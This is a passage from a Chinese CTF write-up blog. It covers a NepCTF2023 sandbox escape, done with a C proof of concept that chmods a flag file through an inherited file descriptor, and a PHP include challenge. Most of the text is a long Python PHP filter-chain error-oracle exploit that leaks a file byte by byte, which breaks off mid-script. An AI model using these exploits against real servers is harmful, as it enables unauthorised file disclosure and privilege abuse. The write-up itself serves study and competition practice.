&#123;<br>            flag=<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">command</span>(server_socket,client_socket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web3.png" alt="image.png"></p><p>文件描述符没有关闭，文件流也没关闭，可以连接父进程的<code>openat</code>和<code>fschmod</code>这两个内置函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename = <span class="hljs-string">&quot;../../../../flag_mini&quot;</span>;<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">openat</span>(<span class="hljs-number">3</span>, filename, O_CREAT | O_WRONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理打开文件失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 更改文件权限为 777</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fchmod</span>(fd, S_IRWXU | S_IRWXG | S_IRWXO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理更改文件权限失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 使用新文件进行操作...</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCBjaGFyKiBmaWxlbmFtZSA9ICIuLi8uLi8uLi8uLi9mbGFnX21pbmkiOwogICAgaW50IGZkID0gb3BlbmF0KDMsIGZpbGVuYW1lLCBPX0NSRUFUIHwgT19XUk9OTFkpOwogICAgaWYgKGZkID09IC0xKSB7CiAgICAgICAgLy8g5aSE55CG5omT5byA5paH5Lu25aSx6LSl55qE5oOF5Ya1CiAgICAgICAgcHJpbnRmKCIxIik7CiAgICB9CgogICAgLy8g5pu05pS55paH5Lu25p2D6ZmQ5Li6IDc3NwogICAgaWYgKGZjaG1vZChmZCwgU19JUldYVSB8IFNfSVJXWEcgfCBTX0lSV1hPKSA9PSAtMSkgewogICAgICAgIC8vIOWkhOeQhuabtOaUueaWh+S7tuadg+mZkOWksei0peeahOaDheWGtQogICAgICAgIHByaW50ZigiMiIpOwogICAgfQoKICAgIC8vIOS9v+eUqOaWsOaWh+S7tui/m+ihjOaTjeS9nC4uLgoKICAgIHJldHVybiAwOwp9|<span class="hljs-built_in">base64</span> -d &gt; poc.c<br></code></pre></td></tr></table></figure><p>注意，由于ctf用户运行是在沙盒里，我们也需要切换过去</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/</span>ctf<span class="hljs-regexp">/sandbox/</span>d41d8cd98f00b204e9800998ecf8427e<br>gcc poc.c -o poc<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web4.png" alt="image.png"></p><p>eth0网卡是172.17.0.19，源码中说了，会判断我们的nc是否和eth0对应的ip一样</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">172.17.0.19</span> <span class="hljs-number">9999</span><br><span class="hljs-attribute">Tmp</span>-Command:./poc<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web5.png"></p><p>成功修改权限</p><h3 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h3><p>操作一下参数得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$jump_link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;link&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$jump_link</span>. <span class="hljs-string">&quot;.txt&quot;</span>); <span class="hljs-comment">// More info? See &quot;/var/www/html/hint.ini&quot; or &quot;./hint.ini&quot;</span><br>    <br>&#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>])) &#123;<br>    <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;<br><span class="hljs-meta">?&gt;</span><br>所以到底来没来? 且看 /<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span>?hint<br><span class="hljs-meta">&lt;?php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Boogipop大佬说一眼看出<code>filterchain</code>，虽然我在比赛前不久学过filterchain，但根本不知道这里为什么要使用</p><p>这里filterchain的问题是<code>/tmp/resources/2.txt</code>的内容为中文</p><p>要先对其进行<code>base64-encode</code>然后再进行<code>filterchain</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从lovephp看侧信道</title>
    <link href="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    <url>/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/</url>
    
    <content type="html"><![CDATA[<h1 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h1><h2 id="什么是侧信道"><a href="#什么是侧信道" class="headerlink" title="什么是侧信道"></a>什么是侧信道</h2><p>个人简单理解就是通过报错，响应时间等信息推断出敏感信息，因此经常通过<strong>盲注</strong>的方式进行攻击</p><p>Boogipop大佬的说法：</p><p>都说侧信道，那什么是侧信道。侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现</p><blockquote><p>盲注攻击在广义上可以被认为是一种侧信道攻击，因为它是利用应用程序的实现细节（如响应时间、错误信息等）推断出敏感信息的一种攻击方式。与其他侧信道攻击不同的是，盲注攻击通常是针对Web应用程序或其他应用程序进行的，而不是直接攻击物理设备或加密算法。<br>在盲注攻击中，攻击者通常无法直接获取目标系统中的敏感信息，而是通过不断地尝试发送恶意数据，并根据应用程序的响应结果进行推断。例如，攻击者可以通过不断地发送不同的请求，根据目标系统返回的响应时间、错误信息等推断出敏感信息，进而实现攻击的目的</p></blockquote><h2 id="DownUnderCTF2022-minimal-php"><a href="#DownUnderCTF2022-minimal-php" class="headerlink" title="[DownUnderCTF2022] minimal-php"></a>[DownUnderCTF2022] minimal-php</h2><p>题目只有一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>Boogipop大佬说够存一辈子的脚本，嘿嘿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">THE GRAND IDEA:</span><br><span class="hljs-string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span><br><span class="hljs-string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span><br><span class="hljs-string">the string is empty.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE GRAND IDEA 2:</span><br><span class="hljs-string">The dechunk filter is interesting.</span><br><span class="hljs-string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span><br><span class="hljs-string">It looks like it was implemented for something http related, but for our purposes, the interesting</span><br><span class="hljs-string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span><br><span class="hljs-string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span><br><span class="hljs-string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span><br><span class="hljs-string"></span><br><span class="hljs-string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string"></span><br><span class="hljs-string">does not cause a 500 error.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE REST:</span><br><span class="hljs-string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span><br><span class="hljs-string">into madness trying to figure out ways to:</span><br><span class="hljs-string">- somehow get other characters not at the start of the flag file to the front</span><br><span class="hljs-string">- detect more precisely which character is at the front</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">join</span>(<span class="hljs-params">*x</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;|&#x27;</span>.join(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">err</span>(<span class="hljs-params">s</span>):<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">raise</span> ValueError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req</span>(<span class="hljs-params">s</span>):<br>data = &#123;<br><span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">f&#x27;php://filter/<span class="hljs-subst">&#123;s&#125;</span>/resource=/flag&#x27;</span><br>&#125;<br><span class="hljs-keyword">return</span> requests.post(<span class="hljs-string">&#x27;http://localhost:5000/index.php&#x27;</span>, data=data).status_code == <span class="hljs-number">500</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 1:</span><br><span class="hljs-string">The second step of our exploit only works under two conditions:</span><br><span class="hljs-string">- String only contains a-zA-Z0-9</span><br><span class="hljs-string">- String ends with two equals signs</span><br><span class="hljs-string"></span><br><span class="hljs-string">base64-encoding the flag file twice takes care of the first condition.</span><br><span class="hljs-string"></span><br><span class="hljs-string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span><br><span class="hljs-string">signs.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Repeated application of the convert.quoted-printable-encode will only consume additional</span><br><span class="hljs-string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span><br><span class="hljs-string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span><br><span class="hljs-string">flag with convert.iconv..CSISO2022KR until it does.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>blow_up_enc = join(*[<span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="hljs-number">1000</span>)<br>blow_up_utf32 = <span class="hljs-string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span><br>blow_up_inf = join(*[blow_up_utf32]*<span class="hljs-number">50</span>)<br><br>header = <span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><br><span class="hljs-comment"># Start get baseline blowup</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calculating blowup&#x27;</span>)<br>baseline_blowup = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>payload = join(*[blow_up_utf32]*n)<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>):<br>baseline_blowup = n<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;baseline blowup is <span class="hljs-subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)<br><br>trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">assert</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)<br>j = [<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>)<br>]<br><span class="hljs-built_in">print</span>(j)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != <span class="hljs-number">2</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">1</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">2</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;j: <span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;header: <span class="hljs-subst">&#123;header&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step two:</span><br><span class="hljs-string">Now we have something of the form</span><br><span class="hljs-string">[a-zA-Z0-9 things]==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span><br><span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span><br><span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span><br><span class="hljs-string">there are filters that *swap* characters:</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span><br><span class="hljs-string">abcdefgh -&gt; badcfehg</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span><br><span class="hljs-string">abcdefgh -&gt; dcbahgfe</span><br><span class="hljs-string"></span><br><span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span><br><span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span><br><span class="hljs-string">the string:</span><br><span class="hljs-string"></span><br><span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span><br><span class="hljs-string"></span><br><span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span><br><span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span><br><span class="hljs-string">bafedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span><br><span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span><br><span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span><br><span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span><br><span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span><br><span class="hljs-string">turns out, if we apply the filter</span><br><span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span><br><span class="hljs-string"></span><br><span class="hljs-string">It will turn the == into:</span><br><span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">And this is magic, because this corrects such that when we apply the</span><br><span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;s recap. We have a string like:</span><br><span class="hljs-string">abcdefghij==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span><br><span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span><br><span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply r4 gadget:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span><br><span 